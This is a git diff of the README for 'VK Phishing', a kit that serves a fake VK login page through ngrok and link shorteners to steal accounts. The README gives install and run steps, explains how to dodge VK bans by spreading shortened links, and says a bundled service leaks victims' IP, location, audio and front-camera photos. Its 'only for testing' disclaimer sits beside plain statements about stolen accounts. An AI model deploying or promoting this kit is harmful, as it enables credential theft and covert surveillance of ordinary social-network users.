@@ -1,23 +1,22 @@
-
 # VK Phishing
 
 This tool is ONLY FOR testing. Author is not responsible for all stolen accounts by this tools.
 
 ## Installation
 
-0. Install [node js and npm](https://nodejs.org/en/download/)  if not installed yet
+0. Install [node js and npm](https://nodejs.org/en/download/) if not installed yet
 
-1. Go to [Releases](https://github.com/AlexXanderGrib/vk-phishing/releases)
+1. Go to [Releases](https://github.com/xxhax-team/vk-phishing/releases)
 
-2. Download the latest
+1. Download the latest
 
-3. Unzip it into the folder
+1. Unzip it into the folder
 
-4. Open this folder in terminal/cmd
+1. Open this folder in terminal/cmd
 
-5. Execute following commands in the terminal:
+1. Execute following commands in the terminal:
 
-``` bash
+```bash
 # Install dependencies and make build
 npm i
 # or yarn install
@@ -25,64 +24,43 @@ npm i
 # Run the app
 npm start
 ```
+
 6. After successful launch you will see something like:
+
 ```bash
 ℹ Listening public url: https://blah.eu.ngrok.io
 ℹ Shorten url is: https://vk.cc/bRuH
 ```
 
 #### DO NOT DISTRIBUTE PUBLIC URL IN VK
+
 You may get banned. Use shorten URL instead
 
 ## Configuration
 
-  
-
-### Login Page [ _DEPRECATED_ since 1.3 ]  
+### Login Page [ _DEPRECATED_ since 1.3 ]
 
 Configuration is stored in `nuxt.config.js`, as the option `vkLogin`. Options (all required):
 
-  
+- `appName` - VK application name
 
-+  `appName` - VK application name
+* `appLogo` - VK application logo, must be square, recommended size is (50x50)
 
-  
-
-+  `appLogo` - VK application logo, must be square, recommended size is (50x50)
-
-  
-
-+  `cancelReturnUrl` - URL, to what user will be redirected, if press cancel button
-
-  
+- `cancelReturnUrl` - URL, to what user will be redirected, if press cancel button
 
 ### Ngrok
 
-  
-
 Ngrok configuration file is in `config/ngrok.yml`. Supported only global options.
-
-  
 
 Read more at [ngrok docs](https://ngrok.com/docs#config)
 
-  
-
 ### Aye Kosmonavt
-
-  
 
 Read his docs [on github](https://github.com/AlexXanderGrib/aye-kosmonavt-api#readme)
 
-  
-
 Here it used for hide ngrok links, what often are banned by VK. Also aye-kosmonavt leaks user data, such as ip, port, user-agent, navigator settings, and can leak location, audio (3 sec) and frontal camera photo.
 
-  
-
 Config stored in `config/aye-kosmonavt.yml`. You can create multiple presets for you convenience and select it by `use` option.
-
-  
 
 Options used in config:
 
@@ -102,20 +80,16 @@ Options used in config:
 
 8.  `afterLoginRedirTime` - time to redirect to `afterLoginUrl`, better is 5-10 secs.
 
-  
-
 ## Change log
 
-  
+**1.4.0**
 
-__1.3.0__
+- Icon updates
+- Fixed some styles
+- Added VK login tests
 
-  
-
+**1.3.0**
 ![speed comparison](speed-comparison.gif)
 
-  
-
 - Removed /admin
-
 - Added static renderer (uses `nuxt generate`) for 2x faster launch & page ttl.
